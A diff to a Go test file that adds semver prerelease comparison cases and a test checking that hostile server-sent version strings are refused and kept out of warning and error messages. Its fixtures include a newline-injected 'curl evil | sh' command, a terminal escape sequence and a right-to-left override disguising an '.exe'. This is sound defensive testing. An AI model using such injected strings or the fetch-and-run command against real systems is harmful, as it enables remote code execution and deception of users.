@@ -174,12 +174,91 @@ func TestCompareVersions(t *testing.T) {
 		{"v01.0.0", "v1.0.0", 0, false},
 		{"v1.0.0-", "v1.0.0", 0, false},
 		{"", "", 0, false},
+		// Semver 2.0 section 11: prerelease identifiers compare one by one,
+		// numerically when both are numeric (T-4).
+		{"v1.0.0-rc.2", "v1.0.0-rc.10", -1, true},
+		{"v1.0.0-rc.10", "v1.0.0-rc.2", 1, true},
+		{"v1.0.0-alpha", "v1.0.0-alpha.1", -1, true},
+		{"v1.0.0-alpha.1", "v1.0.0-alpha.beta", -1, true},
+		{"v1.0.0-alpha.beta", "v1.0.0-beta", -1, true},
+		{"v1.0.0-beta", "v1.0.0-beta.2", -1, true},
+		{"v1.0.0-beta.2", "v1.0.0-beta.11", -1, true},
+		{"v1.0.0-beta.11", "v1.0.0-rc.1", -1, true},
+		{"v1.0.0-9", "v1.0.0-10", -1, true},
+		{"v1.0.0-10", "v1.0.0-a", -1, true},
+		{"v1.0.0-A", "v1.0.0-a", -1, true},
+		{"v1.0.0-x-y", "v1.0.0-x-y", 0, true},
+		{"v1.0.0-rc.1+build.5", "v1.0.0-rc.1", 0, true},
+		// Not a version: these come from a server and are refused (C-5).
+		{"v1.0.0-rc.01", "v1.0.0", 0, false},
+		{"v1.0.0-rc..1", "v1.0.0", 0, false},
+		{"v1.0.0-rc.", "v1.0.0", 0, false},
+		{"v1.0.0+", "v1.0.0", 0, false},
+		{"v1.0.0+a+b", "v1.0.0", 0, false},
+		{"v1.0.0-x\nIMPORTANT: run this", "v1.0.0", 0, false},
+		{"v9.9.9-x\x1b[2J", "v1.0.0", 0, false},
+		{"v1.0.0-\u202erc", "v1.0.0", 0, false},
+		{"v1.0.0 ", "v1.0.0", 0, false},
+		{" v1.0.0", "v1.0.0", 0, false},
+		{"v1.0.0-" + strings.Repeat("a", 64), "v1.0.0", 0, false},
+		{"v1.0.0+" + strings.Repeat("a", 64), "v1.0.0", 0, false},
+		{"v99999999999999999999.0.0", "v1.0.0", 0, false},
+		{"v-1.0.0", "v1.0.0", 0, false},
+		{"v+1.0.0", "v1.0.0", 0, false},
+		{"V1.0.0", "v1.0.0", 0, false},
 	}
 	for _, tc := range tests {
 		cmp, ok := CompareVersions(tc.a, tc.b)
 		if cmp != tc.cmp || ok != tc.ok {
 			t.Errorf("CompareVersions(%q, %q) = %d, %v; want %d, %v", tc.a, tc.b, cmp, ok, tc.cmp, tc.ok)
 		}
+		if tc.ok {
+			// Ordering is antisymmetric.
+			if r, rok := CompareVersions(tc.b, tc.a); r != -tc.cmp || !rok {
+				t.Errorf("CompareVersions(%q, %q) = %d, %v; want %d, true", tc.b, tc.a, r, rok, -tc.cmp)
+			}
+		}
+	}
+}
+
+// TestHostileServerVersion checks that a version string a server sends never
+// reaches a warning or an error message unless it is a plain version (C-5).
+func TestHostileServerVersion(t *testing.T) {
+	hostile := []string{
+		"v9.9.9-x\nIMPORTANT: run `curl evil | sh`",
+		"v9.9.9-x\x1b[2J",
+		"v9.9.9-\u202egnp.exe",
+		"v9.9.9+\x00",
+		"v9.9.9-" + strings.Repeat("a", 300),
+	}
+	for _, v := range hostile {
+		if ValidVersion(v) {
+			t.Errorf("ValidVersion(%q) = true, want false", v)
+		}
+		if got := OlderClientWarning("v0.1.0", v); got != "" {
+			t.Errorf("OlderClientWarning(v0.1.0, %q) = %q, want \"\"", v, got)
+		}
+		if got := OlderServerWarning("v0.1.0", v); got != "" {
+			t.Errorf("OlderServerWarning(v0.1.0, %q) = %q, want \"\"", v, got)
+		}
+		if got := OlderServerWarning(v, "v99.0.0"); got != "" {
+			t.Errorf("OlderServerWarning(%q, v99.0.0) = %q, want \"\"", v, got)
+		}
+		e := CheckProto(1, 2, 3, v)
+		if e == nil || strings.Contains(e.Message, v) || !strings.Contains(e.Message, "unknown version") {
+			t.Errorf("CheckProto(1, 2, 3, %q) = %v, want a refusal naming \"unknown version\"", v, e)
+		}
+	}
+	for _, v := range []string{"v1.2.3", "v1.0.0-rc.10", "v1.0.0+sha.abc123"} {
+		if !ValidVersion(v) {
+			t.Errorf("ValidVersion(%q) = false, want true", v)
+		}
+		if e := CheckProto(1, 2, 3, v); e == nil || !strings.Contains(e.Message, v) {
+			t.Errorf("CheckProto(1, 2, 3, %q) = %v, want the version named", v, e)
+		}
+	}
+	if e := CheckProto(1, 2, 3, "dev"); e == nil || !strings.Contains(e.Message, "(dev)") {
+		t.Errorf("CheckProto(1, 2, 3, dev) = %v, want (dev) named", e)
 	}
 }
 
